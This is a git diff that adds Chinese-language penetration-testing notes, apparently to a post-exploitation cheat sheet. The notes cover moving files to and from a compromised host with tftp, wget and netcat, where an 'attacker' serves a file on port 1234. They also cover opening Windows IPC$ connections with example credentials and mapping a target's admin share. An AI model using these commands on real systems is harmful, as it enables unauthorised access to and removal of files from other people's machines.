@@ -71,3 +71,34 @@ fwrite($f, $data[0]);
 fclose($f);
 ?>
 ```
+
+windows7 下默认是没有tftp的，可以WIN+R，然后输入appwiz.cpl，点击左侧的打开或关闭windows功能后，选中TFTP客户端即可启用TFTP客户端。
+
+(未测试)
+
+```tftp -i host(本地ip,可以是127.0.0.1) GET 1.py(用于保存在本地的文件名) 远程ip\1.py(远程tftp服务器上的文件)```
+
+wget http://192.168.43.68:8000/1.py  cmd默认未安装
+
+
+netcat 文件下载(未测试)
+攻击者在linux下输入命令
+
+cat file|nc -l 1234
+这样把文件file的内容重定向到了攻击者的1234端口，无论谁访问攻击者的ip的这个端口，都能下载到文件了
+
+nc host_ip 1234 > file
+
+建立IPC$连接
+IPC$是Windows系统特有的一项管理功能，是微软公司为了方便用户使用计算机而设计的，主要用来远程管理计算机的。
+net use \\192.168.1.41\ipc$ 123123 /user:Lee   
+通过建立IPC$连接与远程主机实现通信和控制
+
+下面的操作需要管理员权限，只有管理员能够对他们进行远程操作
+net use x: \\192.168.1.41\e$
+打开“我的电脑”，会发现多出一个x盘，上面写着“C$位于192.168.1.41上”，该磁盘即为目标主机的e盘
+
+net use * /del  断开所有IPC$连接
+
+[IPC连接](https://blog.csdn.net/flyingleo1981/article/details/18763229)
+
